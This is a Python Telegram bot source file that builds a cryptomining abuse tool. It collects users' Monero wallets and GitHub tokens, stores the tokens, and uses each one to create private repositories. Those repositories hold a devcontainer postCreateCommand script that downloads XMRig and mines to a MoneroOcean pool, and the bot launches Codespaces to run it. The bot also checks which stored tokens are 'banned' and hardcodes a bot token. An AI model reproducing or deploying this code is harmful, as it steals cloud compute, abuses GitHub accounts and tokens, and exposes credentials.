import os
import time
import sqlite3
import requests
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "8067230426:AAGmGeSe7P7hlnvoCPsw7mDpm1qbtnhASq0"

conn = sqlite3.connect("data.db", check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, wallet TEXT)")
c.execute("CREATE TABLE IF NOT EXISTS tokens (user_id INTEGER, token TEXT)")
conn.commit()

def upload_file(token, username, repo, filename, content):
    encoded = base64.b64encode(content.encode()).decode()
    return requests.put(
        f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
        headers={"Authorization": f"token {token}"},
        json={"message": f"Add {filename}", "content": encoded, "branch": "main"}
    )

def create_two_repos_and_codespaces(github_token, wallet):
    headers = {"Authorization": f"token {github_token}"}
    user_info = requests.get("https://api.github.com/user", headers=headers).json()
    username = user_info.get("login")
    if not username:
        return None, False

    files = {
        "devcontainer.json": '''{
  "name": "XMRig Codespace",
  "postCreateCommand": "bash c9ep7c.sh"
}''',
        "c9ep7c.sh": f'''#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
tar -xvf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
chmod +x xmrig
./xmrig -o gulf.moneroocean.stream:10128 -u {wallet} -p codespace --donate-level 1 --threads 4
''',
        "README.md": "# Auto mining repo"
    }

    for _ in range(2):
        repo_name = f"xmrig-{os.urandom(3).hex()}"
        repo_resp = requests.post("https://api.github.com/user/repos", headers=headers, json={
            "name": repo_name,
            "private": True,
            "auto_init": True
        })
        if repo_resp.status_code != 201:
            continue

        for fname, content in files.items():
            upload_file(github_token, username, repo_name, fname, content)

        time.sleep(8)

        repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers).json()
        repo_id = repo_data.get("id")
        if not repo_id:
            continue

        resp = requests.post(
            "https://api.github.com/user/codespaces",
            headers={**headers, "Accept": "application/vnd.github+json"},
            json={
                "repository_id": repo_id,
                "ref": "main",
                "location": "WestUs2",
                "machine": "basicLinux"
            }
        )
        print("[Codespace]", resp.status_code, resp.text)

    return username, True

async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /wallet <XMR_wallet>")
        return
    wallet = context.args[0]
    c.execute("INSERT OR REPLACE INTO users (user_id, wallet) VALUES (?, ?)", (user_id, wallet))
    conn.commit()
    await update.message.reply_text("✅ Wallet saved! You're ready to mine.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usage: /token <GitHub_token_1> <GitHub_token_2> ...")
        return
    c.execute("SELECT wallet FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if not row:
        await update.message.reply_text("⚠️ First set your wallet using /wallet")
        return
    wallet = row[0]

    reply = ""
    for github_token in context.args:
        c.execute("INSERT INTO tokens (user_id, token) VALUES (?, ?)", (user_id, github_token))
        conn.commit()
        username, success = create_two_repos_and_codespaces(github_token, wallet)
        if success:
            reply += f"😈 Token OK\n👤 GitHub: {username}\n✅ 2 Repos Created\n✅ 2 Codespaces Started\n\n"
        else:
            reply += f"❌ Token {github_token[:8]}... is invalid or failed\n\n"

    await update.message.reply_text(reply.strip())

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
    tokens = c.fetchall()
    active = banned = 0
    for (token,) in tokens:
        res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"})
        if res.status_code == 200:
            active += 1
        else:
            banned += 1
    total = active + banned
    await update.message.reply_text(
        f"👤 Your GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}\n━━━━━━━━━━━━━━━"
    )

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("wallet", wallet))
app.add_handler(CommandHandler("token", token))
app.add_handler(CommandHandler("check", check))
app.run_polling()
